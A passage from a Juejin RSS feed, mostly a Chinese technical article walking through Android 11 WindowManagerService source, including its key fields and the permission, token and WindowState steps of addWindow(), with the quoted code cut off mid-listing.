<p>本文围绕 Agent Skills 展开，它是渐进式披露的提示词管理机制，能降低 Token 消耗。以 Claude Code 为例，介绍安装、使用及进阶方法。还对比了与 MCP 的区别，助开发者构建强大智能体。</p>
</blockquote>
<h2 data-id="heading-5">📖 投稿专区</h2>
<blockquote>
<p>大家可以在评论区推荐认为不错的文章，并附上链接和推荐理由，有机会呈现在下一期。文章创建日期必须在下期掘金一周发布前一周以内；可以推荐自己的文章、也可以推荐他人的文章。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WMS源码解析]]></title>    <link>https://juejin.cn/post/7603185231801139226</link>    <guid>https://juejin.cn/post/7603185231801139226</guid>    <pubDate>2026-02-05T08:32:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603185231801139226" data-draft-id="7600953879501078579" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WMS源码解析"/> <meta itemprop="keywords" content="源码"/> <meta itemprop="datePublished" content="2026-02-05T08:32:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XRay"/> <meta itemprop="url" content="https://juejin.cn/user/3966693685869288"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WMS源码解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3966693685869288/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XRay
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T08:32:33.000Z" title="Thu Feb 05 2026 08:32:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一. WMS</h2>
<p>WMS 是 Android 中很重要的一个服务，它是 WindowManager 的管理者，WMS 无论对于应用开发还是 Framework 开发来说都是重要的知识点，其原因是因为 WMS 有很多职责，每个职责都会涉及重要且复杂的系统，这使得 WMS 就像一个十字路口的交通灯一样，没有了这个交通灯，十字路口就无法正常通车。</p>
<p>WMS 的职责简单来说主要有以下几点：</p>
<ol>
<li>窗口管理：WMS 是窗口的管理者，它负责窗口的启动、添加和删除。另外窗口的大小和层级也是由 WMS 进行管理的。</li>
<li>窗口动画：窗口动画由 WMS 的动画子系统来负责，动画子系统的管理者为 WindowAnimator。</li>
<li>输入系统中转站：通过对窗口的触摸从而产生触摸事件，InputManagerService（IMS）会对触摸事件进行处理，它会寻找一个最合适的窗口来处理触摸反馈信息，WMS 是窗口的管理者，它作为输入系统的中转站再合适不过了。</li>
<li>Surface 管理：窗口不具备绘制功能，因此每个窗口都需要有一块 Surface 来供自己绘制，为每个窗口分配 Surface 是由 WMS 来完成的。</li>
</ol>
<p>WMS的职责可以简单总结为下图：
<img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d32fd0132c804c3c885a8849e73bb679~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=871&amp;h=448&amp;s=23841&amp;e=png&amp;b=ffffff" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">二. WMS 的重要成员</h2>
<p>WMS 的部分成员变量如下，本文源码基于 Android 11.0。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WindowManagerService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IWindowManager</span>.Stub
        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Watchdog</span>.Monitor, WindowManagerPolicy.WindowManagerFuncs {

    WindowManagerPolicy mPolicy;
    <span class="hljs-keyword">final</span> ArraySet&lt;Session&gt; mSessions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArraySet</span>&lt;&gt;();
    <span class="hljs-keyword">final</span> HashMap&lt;IBinder, WindowState&gt; mWindowMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-comment">/**
    * Windows that are being resized. Used so we can tell the client about
    * the resize after closing the transaction in which we resized the
    * underlying surface.
    */</span>
    <span class="hljs-keyword">final</span> ArrayList&lt;WindowState&gt; mResizingWindows = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">/**
    * Windows whose animations have ended and now must be removed.
    */</span>
    <span class="hljs-keyword">final</span> ArrayList&lt;WindowState&gt; mPendingRemove = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">/**
    * Used when processing mPendingRemove to avoid working on the original array.
    */</span>
    WindowState[] mPendingRemoveTmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowState</span>[<span class="hljs-number">20</span>];

    <span class="hljs-comment">/**
    * Windows whose surface should be destroyed.
    */</span>
    <span class="hljs-keyword">final</span> ArrayList&lt;WindowState&gt; mDestroySurface = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">/**
    * Windows with a preserved surface waiting to be destroyed. These windows
    * are going through a surface change. We keep the old surface around until
    * the first frame on the new surface finishes drawing.
    */</span>
    <span class="hljs-keyword">final</span> ArrayList&lt;WindowState&gt; mDestroyPreservedSurface = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">final</span> InputManagerService mInputManager;

    <span class="hljs-keyword">final</span> WindowAnimator mAnimator;

    <span class="hljs-keyword">final</span> <span class="hljs-type">H</span> <span class="hljs-variable">mH</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">H</span>();
}
</code></pre>
<h3 data-id="heading-2">1. mPolicy：WindowManagerPolicy</h3>
<p>WindowManagerPolicy（WMP）类型的变量。WindowManagerPolicy 是窗口管理策略的接口类，用来定义一个窗口策略所要遵循的通用规范，并提供了 WindowManager 所有的特定的 UI 行为。它的具体实现类为 PhoneWindowManager ，这个实现类在 WMS 创建时被创建。WMP 允许定制窗口层级和特殊窗口类型以及关键的调度和布局。</p>
<h3 data-id="heading-3">2. mSessions：ArraySet&lt;Session&gt;</h3>
<p>ArraySet&lt;Session&gt; 类型的变量。它主要用于进程间通信，其他的应用程序进程想要和 WMS 进程进行通信就需要经过 Session ，并且每个应用程序进程都会对应一个 Session ，WMS 保存这些 Session 用来记录所有向 WMS 提出窗口管理服务的客户端。</p>
<h3 data-id="heading-4">3. mWindowMap：HashMap&lt;IBinder, WindowState&gt;</h3>
<p>mWindowMap 是一个 HashMap，key 的类型为 IBinder ，value 的类型为 WindowState 。WindowState 用于保存窗口的信息，在 WMS 中它用来描述一个窗口。综上得出结论，mWindowMap 就是用来保存 WMS 中各种窗口的集合。</p>
<h3 data-id="heading-5">4.mResizingWindows：ArrayList&lt;WindowState&gt;</h3>
<p>mResizingWindows 是用来存储正在调整大小的窗口的列表的。与 mResizingWindows 类似的还有 mPendingRemove、mDestroySurface 和 mDestroyPreservedSurface 等，其中 mPendingRemove 是在内存耗尽时设置的，里面存有需要强制删除的窗口，mDestroySurface 里面存有需要被销毁的Surface，mDestroyPreservedSurface 里面存有窗口需要保存的等待销毁的 Surface，为什么窗口要保存这些 Surface ？这是因为当窗口经历 Surface 变化时，窗口需要一直保持旧的 Surface，直到新 Surface 的第一帧绘制完成。</p>
<h3 data-id="heading-6">5.mAnimator：WindowAnimator</h3>
<p>mAnimator 是 WindowAnimator 类型的变量，用于管理窗口的动画以及特效动画。</p>
<h3 data-id="heading-7">6.mH：H</h3>
<p>mH 是 H 类型的变量，系统的 Handler 类，用于将任务加入到主线程的消息队列中，这样代码逻辑就会在主线程中执行。</p>
<h3 data-id="heading-8">7.mInputManager：InputManagerService</h3>
<p>InputManagerService 类型的变量，输入系统的管理者。InputManagerService（IMS）会对触摸事件进行处理，它会寻找一个最合适的窗口来处理触摸反馈信息，WMS 是窗口的管理者，因此，WMS “理所应当” 的成为了输入系统的中转站。</p>
<p>还需要理解的几个概念：</p>
<p><strong>WindowToken</strong>：</p>
<ul>
<li>可以理解为窗口令牌，当应用程序想要向 WMS 申请新创建一个窗口，则需要向 WMS 出示有效的 WindowToken。WindowToken 会将相同组件（比如同一个Acitivity）的窗口（WindowState）集合在一起，方便管理。</li>
</ul>
<p><strong>WindowState</strong>:</p>
<ul>
<li>WindowState 表示一个窗口的所有属性，且存在于 WMS 端，所以它是 WMS 中事实上的窗口。App 端的一个 Window，在 WMS 端就会有一个 WindowState 。</li>
</ul>
<h2 data-id="heading-9">三. Window 的添加过程（WMS 处理的部分）</h2>
<p>对 Window 的操作分为两大部分，一部分是 WindowManger 的处理，在 <a href="https://juejin.cn/post/7602259669706801178" target="_blank" title="https://juejin.cn/post/7602259669706801178">Window和WindowManager源码解析</a> 中已经分析过，另一部分是 WMS 的处理，这里我们来分析 WMS 处理的部分。Window 的添加过程都会调用 WMS 的 addWindow() 方法，由于这个方法代码逻辑比较多，这里分成3个部分来分析。</p>
<h3 data-id="heading-10">3.1 窗口检查</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WindowManagerService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IWindowManager</span>.Stub
        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Watchdog</span>.Monitor, WindowManagerPolicy.WindowManagerFuncs {

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addWindow</span><span class="hljs-params">(Session session, IWindow client, <span class="hljs-type">int</span> seq,
                         LayoutParams attrs, <span class="hljs-type">int</span> viewVisibility, <span class="hljs-type">int</span> displayId, Rect outFrame,
                         Rect outContentInsets, Rect outStableInsets,
                         DisplayCutout.ParcelableWrapper outDisplayCutout, InputChannel outInputChannel,
                         InsetsState outInsetsState, InsetsSourceControl[] outActiveControls,
                         <span class="hljs-type">int</span> requestUserId)</span> {
        Arrays.fill(outActiveControls, <span class="hljs-literal">null</span>);
        <span class="hljs-type">int</span>[] appOp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
        <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isRoundedCornerOverlay</span> <span class="hljs-operator">=</span> (attrs.privateFlags
                &amp; PRIVATE_FLAG_IS_ROUNDED_CORNERS_OVERLAY) != <span class="hljs-number">0</span>;
        <span class="hljs-comment">// 调用 WindowManagerPolicy 的 checkAddPermission() 方法来检查权限 </span>
        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> mPolicy.checkAddPermission(attrs.type, isRoundedCornerOverlay, attrs.packageName,
                appOp);
        <span class="hljs-keyword">if</span> (res != WindowManagerGlobal.ADD_OKAY) {
            <span class="hljs-keyword">return</span> res;
        }
        ...
        <span class="hljs-keyword">synchronized</span> (mGlobalLock) {
            ...
            <span class="hljs-comment">// 通过 DisplayId 来获得窗口要添加到哪个 DisplayContent 上</span>
            <span class="hljs-keyword">final</span> <span class="hljs-type">DisplayContent</span> <span class="hljs-variable">displayContent</span> <span class="hljs-operator">=</span> getDisplayContentOrCreate(displayId, attrs.token);

            <span class="hljs-comment">// 如果没有找到 DisplayContent，返回 WindowManagerGlobal.ADD_INVALID_DISPLAY</span>
            <span class="hljs-keyword">if</span> (displayContent == <span class="hljs-literal">null</span>) {
                ProtoLog.w(WM_ERROR, <span class="hljs-string">"Attempted to add window to a display that does "</span>
                        + <span class="hljs-string">"not exist: %d. Aborting."</span>, displayId);
                <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_INVALID_DISPLAY;
            }
            <span class="hljs-keyword">if</span> (!displayContent.hasAccess(session.mUid)) {
                ProtoLog.w(WM_ERROR,
                        <span class="hljs-string">"Attempted to add window to a display for which the application "</span>
                                + <span class="hljs-string">"does not have access: %d. Aborting."</span>, displayId);
                <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_INVALID_DISPLAY;
            }

            <span class="hljs-keyword">if</span> (mWindowMap.containsKey(client.asBinder())) {
                ProtoLog.w(WM_ERROR, <span class="hljs-string">"Window %s is already added"</span>, client);
                <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_DUPLICATE_ADD;
            }

            <span class="hljs-comment">// type 在 FIRST_SUB_WINDOW 与 LAST_SUB_WINDOW 之间（1000~1999），说明是子窗口</span>
            <span class="hljs-keyword">if</span> (type &gt;= FIRST_SUB_WINDOW &amp;&amp; type &lt;= LAST_SUB_WINDOW) {
                <span class="hljs-comment">// attrs.token 是 IBinder 类型的对象</span>
                parentWindow = windowForClientLocked(<span class="hljs-literal">null</span>, attrs.token, <span class="hljs-literal">false</span>);
                <span class="hljs-keyword">if</span> (parentWindow == <span class="hljs-literal">null</span>) {
                    ProtoLog.w(WM_ERROR, <span class="hljs-string">"Attempted to add window with token that is not a window: "</span>
                            + <span class="hljs-string">"%s. Aborting."</span>, attrs.token);
                    <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_BAD_SUBWINDOW_TOKEN;
                }
                <span class="hljs-keyword">if</span> (parentWindow.mAttrs.type &gt;= FIRST_SUB_WINDOW
                        &amp;&amp; parentWindow.mAttrs.type &lt;= LAST_SUB_WINDOW) {
                    ProtoLog.w(WM_ERROR, <span class="hljs-string">"Attempted to add window with token that is a sub-window: "</span>
                            + <span class="hljs-string">"%s. Aborting."</span>, attrs.token);
                    <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_BAD_SUBWINDOW_TOKEN;
                }
            }
        }
        ...
        <span class="hljs-keyword">return</span> res;
    }
}
</code></pre>
<p>WMS 的 addWindow() 的返回值表示的是 addWindow() 的各种状态，是一个 int 值，定义在 WindowManagerGlobal 中。在 addWindow() 方法中先调用 WindowManagerPolicy 的 checkAddPermission() 方法来检查权限，具体在 PhoneWindowManager 的 checkAddPermission() 方法中实现，如果没有权限就不会执行后续的代码逻辑。然后通过 DisplayId 来获得窗口要添加到哪个 DisplayContent 上，如果没有找到 DisplayContent ，返回 ADD_INVALID_DISPLAY，其中 DisplayContent 是用来描述一块屏幕的。其中 type 表示窗口的类型，如果介于 FIRST_SUB_WINDOW 和 LAST_SUB_WINDOW 之间，说明这个窗口是一个子窗口，要拿到父窗口的 WindowState，attrs.token 是 IBinder 类型，windowForClientLocked() 方法会根据 attrs.token 作为 key 值从 mWindowMap 中得到该子窗口的父窗口。接着对父窗口进行判断，如果父窗口的 WindowState 为 null 或者父窗口的 type 也是子窗口的范围，会返回错误状态。</p>
<h3 data-id="heading-11">3.2 WindowToken 相关处理</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 通过 DisplayContent 尝试获取 WindowToken </span>
<span class="hljs-type">WindowToken</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> displayContent.getWindowToken(
        hasParent ? parentWindow.mAttrs.token : attrs.token);
<span class="hljs-comment">// If this is a child window, we want to apply the same type checking rules as the</span>
<span class="hljs-comment">// parent window type.</span>
<span class="hljs-comment">// 如果有父窗口，就将父窗口的 type 赋值给 rootType，如果没有就将当前窗口的 type 赋值给 rootType</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">rootType</span> <span class="hljs-operator">=</span> hasParent ? parentWindow.mAttrs.type : type;

<span class="hljs-type">boolean</span> <span class="hljs-variable">addToastWindowRequiresToken</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-comment">// 如果 token 为 null</span>
<span class="hljs-keyword">if</span> (token == <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// 使用 unprivilegedAppCanCreateTokenWith() 方法对 rootType 和 type 进行检查</span>
    <span class="hljs-keyword">if</span> (!unprivilegedAppCanCreateTokenWith(parentWindow, callingUid, type,
            rootType, attrs.token, attrs.packageName)) {
        <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_BAD_APP_TOKEN;
    }
    <span class="hljs-keyword">final</span> <span class="hljs-type">IBinder</span> <span class="hljs-variable">binder</span> <span class="hljs-operator">=</span> attrs.token != <span class="hljs-literal">null</span> ? attrs.token : client.asBinder();
    <span class="hljs-comment">// 创建 WindowToken，第 4 个参数为 false ，表示这个 WindowToken 是隐式创建的</span>
    token = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowToken</span>(<span class="hljs-built_in">this</span>, binder, type, <span class="hljs-literal">false</span>, displayContent,
            session.mCanAddInternalSystemWindow, isRoundedCornerOverlay);
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rootType &gt;= FIRST_APPLICATION_WINDOW
        &amp;&amp; rootType &lt;= LAST_APPLICATION_WINDOW) {
    activity = token.asActivityRecord();
    <span class="hljs-keyword">if</span> (activity == <span class="hljs-literal">null</span>) {
        ProtoLog.w(WM_ERROR, <span class="hljs-string">"Attempted to add window with non-application token "</span>
                + <span class="hljs-string">".%s Aborting."</span>, token);
        <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_NOT_APP_TOKEN;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (activity.getParent() == <span class="hljs-literal">null</span>) {
        ProtoLog.w(WM_ERROR, <span class="hljs-string">"Attempted to add window with exiting application token "</span>
                + <span class="hljs-string">".%s Aborting."</span>, token);
        <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_APP_EXITING;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == TYPE_APPLICATION_STARTING &amp;&amp; activity.startingWindow != <span class="hljs-literal">null</span>) {
        ProtoLog.w(WM_ERROR,
                <span class="hljs-string">"Attempted to add starting window to token with already existing"</span>
                        + <span class="hljs-string">" starting window"</span>);
        <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_DUPLICATE_ADD;
    }
} 
...
</code></pre>
<p>这里先通过 DisplayContent 的 getWindowToken() 方法尝试获取 WindowToken ，如果有父窗口，就将父窗口的 type 赋值给 rootType ，如果没有，就将当前窗口的 type 赋值给 rootType 。接下来如果 token 为 null ，使用 unprivilegedAppCanCreateTokenWith() 方法对 rootType 和 type 进行检查，里面检查如果 rootType 值等于 TYPE_INPUT_METHOD、TYPE_WALLPAPER 等值时，则返回 ADD_BAD_APP_TOKEN，说明 rootType 值等于 TYPE_INPUT_METHOD、TYPE_WALLPAPER 等值时是不允许 WindowToken 为 null 的。如果检查通过了，会创建 WidowToken，这说明当我们添加窗口时可以不向 WMS 提供 WindowToken，前提是 rootType 和 type 的值不为前面条件判断筛选的值。WindowToken 隐式和显式的创建肯定是要加以区分的，创建 WidowToken 传入的第 4 个参数为 false 就表示这个 WindowToken 是隐式创建的。</p>
<p>接下来的代码逻辑就是 WindowToken 不为 null 的情况，根据 rootType 和 type 的值进行判断。先判断如果窗口为应用程序窗口，通过 WindowToken 的 asActivityRecord() 方法拿到 ActivityRecord，然后根据 ActivityRecord 进行后续的判断，返回不同的状态码。</p>
<h3 data-id="heading-12">3.3 WindowState 的创建和处理</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建 WindowState，它存有窗口的所有状态信息，在 WMS 中它代表一个窗口，</span>
<span class="hljs-comment">// this 指的是 WMS，client 指的是 IWindow， token 指的是 WindowToken。</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">WindowState</span> <span class="hljs-variable">win</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowState</span>(<span class="hljs-built_in">this</span>, session, client, token, parentWindow,
        appOp[<span class="hljs-number">0</span>], seq, attrs, viewVisibility, session.mUid, userId,
        session.mCanAddInternalSystemWindow);

<span class="hljs-comment">// 判断请求添加窗口的客户端是否已经死亡 </span>
<span class="hljs-keyword">if</span> (win.mDeathRecipient == <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// Client has apparently died, so there is no reason to</span>
    <span class="hljs-comment">// continue.</span>
    ProtoLog.w(WM_ERROR, <span class="hljs-string">"Adding window client %s"</span>
            + <span class="hljs-string">" that is dead, aborting."</span>, client.asBinder());
    <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_APP_EXITING;
}

<span class="hljs-comment">// 判断窗口的 DisplayContent 是否为 null</span>
<span class="hljs-keyword">if</span> (win.getDisplayContent() == <span class="hljs-literal">null</span>) {
    ProtoLog.w(WM_ERROR, <span class="hljs-string">"Adding window to Display that has been removed."</span>);
    <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_INVALID_DISPLAY;
}

<span class="hljs-keyword">final</span> <span class="hljs-type">DisplayPolicy</span> <span class="hljs-variable">displayPolicy</span> <span class="hljs-operator">=</span> displayContent.getDisplayPolicy();
<span class="hljs-comment">// 根据窗口的 type 对窗口的 LayoutParams 的一些成员变量进行修改</span>
displayPolicy.adjustWindowParamsLw(win, win.mAttrs, callingPid, callingUid);
<span class="hljs-comment">// 根据窗口的 type 检查是否可以把这个窗口添加到系统中</span>
res = displayPolicy.validateAddingWindowLw(attrs, callingPid, callingUid);
<span class="hljs-keyword">if</span> (res != WindowManagerGlobal.ADD_OKAY) {
    <span class="hljs-keyword">return</span> res;
}
...
win.attach();
<span class="hljs-comment">//将 WindowState 添加到 mWindowMap 中</span>
mWindowMap.put(client.asBinder(), win);
win.initAppOpsState();

<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">suspended</span> <span class="hljs-operator">=</span> mPmInternal.isPackageSuspended(win.getOwningPackage(),
        UserHandle.getUserId(win.getOwningUid()));
win.setHiddenWhileSuspended(suspended);

<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hideSystemAlertWindows</span> <span class="hljs-operator">=</span> !mHidingNonSystemOverlayWindows.isEmpty();
win.setForceHideNonSystemOverlayWindowIfNeeded(hideSystemAlertWindows);

<span class="hljs-keyword">final</span> <span class="hljs-type">ActivityRecord</span> <span class="hljs-variable">tokenActivity</span> <span class="hljs-operator">=</span> token.asActivityRecord();
<span class="hljs-keyword">if</span> (type == TYPE_APPLICATION_STARTING &amp;&amp; tokenActivity != <span class="hljs-literal">null</span>) {
    tokenActivity.startingWindow = win;
    ProtoLog.v(WM_DEBUG_STARTING_WINDOW, <span class="hljs-string">"addWindow: %s startingWindow=%s"</span>,
            activity, win);
}

<span class="hljs-type">boolean</span> <span class="hljs-variable">imMayMove</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
<span class="hljs-comment">//将 WindowState 添加到该 WindowState 对应的 WindowToken 中</span>
win.mToken.addWindow(win);
displayPolicy.addWindowLw(win, attrs);
<span class="hljs-keyword">if</span> (type == TYPE_INPUT_METHOD) {
    displayContent.setInputMethodWindowLocked(win);
    imMayMove = <span class="hljs-literal">false</span>;
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == TYPE_INPUT_METHOD_DIALOG) {
    displayContent.computeImeTarget(<span class="hljs-literal">true</span> <span class="hljs-comment">/* updateImeTarget */</span>);
    imMayMove = <span class="hljs-literal">false</span>;
} <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">if</span> (type == TYPE_WALLPAPER) {
        displayContent.mWallpaperController.clearLastWallpaperTimeoutTime();
        displayContent.pendingLayoutChanges |= FINISH_LAYOUT_REDO_WALLPAPER;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((attrs.flags &amp; FLAG_SHOW_WALLPAPER) != <span class="hljs-number">0</span>) {
        displayContent.pendingLayoutChanges |= FINISH_LAYOUT_REDO_WALLPAPER;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (displayContent.mWallpaperController.isBelowWallpaperTarget(win)) {
        <span class="hljs-comment">// If there is currently a wallpaper being shown, and</span>
